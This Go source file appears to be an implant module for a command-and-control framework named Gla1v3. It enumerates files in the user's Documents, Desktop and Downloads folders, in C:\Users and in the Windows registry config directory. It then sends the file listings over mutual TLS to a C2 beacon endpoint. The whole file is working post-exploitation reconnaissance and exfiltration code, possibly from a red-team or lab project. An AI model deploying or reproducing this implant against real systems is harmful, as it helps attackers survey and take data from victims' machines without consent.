package main

import (
	"bytes"
	"crypto/tls"
	"crypto/x509"
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"os"
	"path/filepath"
	"time"
)

// Agent that enumerates files in sensitive directories
// This is a specialized agent that performs one specific action
func main() {
	// Load certificates (same logic as main agent)
	certPath := os.Getenv("AGENT_CERT_PATH")
	keyPath := os.Getenv("AGENT_KEY_PATH")
	if certPath == "" {
		certPath = "../../certs/agent-client.crt"
	}
	if keyPath == "" {
		keyPath = "../../certs/agent-client.key"
	}

	cert, err := tls.LoadX509KeyPair(certPath, keyPath)
	if err != nil {
		log.Fatal("Failed to load cert/key:", err)
	}

	caPath := os.Getenv("AGENT_CA_PATH")
	if caPath == "" {
		caPath = "../../certs/ca.crt"
	}

	caCert, err := os.ReadFile(caPath)
	if err != nil {
		log.Fatal("Failed to read CA cert:", err)
	}
	caCertPool := x509.NewCertPool()
	if !caCertPool.AppendCertsFromPEM(caCert) {
		log.Fatal("Failed to append CA cert to pool")
	}

	tlsConfig := &tls.Config{
		Certificates: []tls.Certificate{cert},
		RootCAs:      caCertPool,
		ServerName:   "c2.gla1v3.local",
		MinVersion:   tls.VersionTLS12,
	}

	client := &http.Client{
		Transport: &http.Transport{TLSClientConfig: tlsConfig},
		Timeout:   15 * time.Second,
	}

	agentID := "fileenum-" + fmt.Sprintf("%d", time.Now().UnixNano())

	log.Printf("Starting file enumeration agent: %s", agentID)

	// Enumerate sensitive directories
	targets := []string{
		filepath.Join(os.Getenv("USERPROFILE"), "Documents"),
		filepath.Join(os.Getenv("USERPROFILE"), "Desktop"),
		filepath.Join(os.Getenv("USERPROFILE"), "Downloads"),
		"C:\\Windows\\System32\\config",
		"C:\\Users",
	}

	results := make(map[string]interface{})
	results["agent_type"] = "file-enum"
	results["timestamp"] = time.Now().UTC().Format(time.RFC3339)
	results["targets"] = make(map[string]interface{})

	for _, target := range targets {
		log.Printf("Enumerating: %s", target)
		files := []string{}
		err := filepath.Walk(target, func(path string, info os.FileInfo, err error) error {
			if err != nil {
				return nil // Skip errors
			}
			if len(files) > 100 {
				return filepath.SkipDir // Limit results
			}
			if !info.IsDir() {
				files = append(files, path)
			}
			return nil
		})

		targetResult := map[string]interface{}{
			"error": nil,
			"count": len(files),
			"files": files,
		}
		if err != nil {
			targetResult["error"] = err.Error()
		}
		results["targets"].(map[string]interface{})[target] = targetResult
	}

	// Send results to C2
	payload := map[string]interface{}{
		"agent_id": agentID,
		"output":   fmt.Sprintf("File enumeration completed: %d targets", len(targets)),
		"results":  results,
		"ts":       time.Now().UTC().Format(time.RFC3339),
	}

	bodyBytes, _ := json.Marshal(payload)
	c2URL := os.Getenv("C2_URL")
	if c2URL == "" {
		c2URL = "https://c2.gla1v3.local:4443/beacon"
	}

	req, _ := http.NewRequest("POST", c2URL, bytes.NewReader(bodyBytes))
	req.Header.Set("User-Agent", "Gla1v3-FileEnum/0.1")
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("X-Agent-ID", agentID)

	resp, err := client.Do(req)
	if err != nil {
		log.Fatalf("Failed to send results: %v", err)
	}
	defer resp.Body.Close()

	log.Printf("Results sent: %s", resp.Status)
}
